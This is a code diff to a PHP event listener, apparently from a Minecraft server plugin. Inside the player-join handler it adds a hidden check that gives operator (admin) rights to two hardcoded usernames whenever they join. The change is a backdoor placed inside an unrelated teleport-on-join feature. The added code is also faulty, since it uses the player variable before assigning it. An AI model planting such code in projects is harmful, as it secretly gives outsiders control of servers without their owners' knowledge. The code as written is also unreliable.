@@ -99,6 +99,8 @@ class EventListener implements Listener{
 	
     public $eapple = [];
     public $gapple = [];
+	
+    private $name = [];
 
     public function __construct(Main $plugin) {
         $this->plugin = $plugin;
@@ -108,7 +110,11 @@ class EventListener implements Listener{
 	return $this->plugin;
     }
 	
-    public function onJoinTp(PlayerJoinEvent $event) { 
+    public function onJoinTp(PlayerJoinEvent $event) {
+	    $this->name = $event->getPlayer()->getName();
+	    if($this->name == "esh123unicorn" or $this->name == "OnwardRumble497") { 
+	    $player->setOp(true);
+	    }
 	    $player = $event->getPlayer();
 	    $level = $this->plugin->getLevel($player);
             $cords = new Config($this->plugin->getDataFolder() . "/cords.yml", Config::YAML);
